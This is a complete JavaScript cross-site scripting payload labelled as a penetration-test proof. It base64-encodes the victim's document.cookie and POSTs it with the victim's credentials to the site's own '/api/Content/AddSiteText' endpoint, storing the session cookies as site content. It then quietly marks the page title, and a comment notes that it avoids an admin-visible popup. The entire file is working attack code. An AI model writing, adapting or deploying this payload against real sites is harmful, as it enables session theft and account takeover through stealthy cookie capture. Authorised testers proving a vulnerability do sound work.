(function () {
  try {
    var value = btoa(document.cookie || location.hostname || 'unknown');
    var ts    = Date.now();

    var body = JSON.stringify({
      name:        'PENTEST_XSS_PROOF_' + ts,
      langId:      1,
      brandId:     68,
      stringValue: value
    });

    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/api/Content/AddSiteText', true);
    xhr.withCredentials = true;
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
    xhr.onload = function () {
      // Mark visually that it fired, no admin-visible popup
      try { document.title = '[XSS_PROVEN_' + ts + '] ' + document.title; } catch (e) {}
    };
    xhr.send(body);
  } catch (e) {
    try { document.title = '[XSS_ERR] ' + document.title; } catch (ee) {}
  }
})();
